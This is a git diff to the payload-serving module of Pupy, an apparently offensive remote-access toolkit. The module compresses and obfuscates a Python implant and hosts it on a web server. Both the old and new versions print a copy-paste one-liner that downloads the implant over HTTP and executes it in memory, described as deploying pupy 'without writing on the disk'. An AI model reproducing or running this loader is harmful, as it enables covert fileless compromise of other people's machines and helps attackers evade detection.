@@ -3,11 +3,10 @@
 # Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
 # Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
 
-from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
 import re
 import os.path
 
-from pupylib.PupyOutput import Success, Warn, List
+from pupylib.PupyOutput import Success, Warn, Error, List
 from pupylib.utils.obfuscate import compress_encode_obfs
 from pupylib.payloads import dependencies
 from pupylib import ROOT
@@ -63,37 +62,21 @@ def pack_py_payload(display, conf, debug=False):
     return compress_encode_obfs(payload, main=True)
 
 
-def serve_payload(display, payload, ip="0.0.0.0", port=8080, link_ip="<your_ip>"):
-    class PupyPayloadHTTPHandler(BaseHTTPRequestHandler):
-        def do_GET(self):
-            self.send_response(200)
-            self.send_header('Content-type', 'text/html')
-            self.end_headers()
-            # Send the html message
-            self.wfile.write(payload)
-            return
-    try:
-        while True:
-            try:
-                server = HTTPServer((ip, port), PupyPayloadHTTPHandler)
-                break
-            except Exception as e:
-                # [Errno 98] Adress already in use
-                if e[0] == 98:
-                    port+=1
-                else:
-                    raise
+def serve_payload(display, server, payload, link_ip="<your_ip>"):
+    if not server:
+        display(Error('Oneliners only supported from pupysh'))
+        return
 
-        display(List([
-                "python -c 'import urllib;exec urllib.urlopen(\"http://%s:%s/index\").read()'"%(link_ip, port),
-            ], caption=Success(
-                'Copy/paste this one-line loader to deploy pupy without writing on the disk')))
+    if not server.pupweb:
+        display(Error('Webserver disabled'))
+        return
 
-        display(Success('Started http server on %s:%s '%(ip, port)))
-        display(Success('Waiting for a connection ...'))
-        server.serve_forever()
+    landing_uri = server.pupweb.serve_content(payload, alias='py payload')
 
-    except KeyboardInterrupt:
-        display(Warn('KeyboardInterrupt received, shutting down the web server'))
-        server.socket.close()
-        server.shutdown()
+    display(Warn('Python 2.7.x required, x should be >= 9'))
+
+    display(List([
+        "python -c 'import urllib;exec urllib.urlopen(\"http://%s:%s%s\").read()'"%(
+            link_ip, server.pupweb.port, landing_uri),
+    ], caption=Success(
+        'Copy/paste this one-line loader to deploy pupy without writing on the disk')))
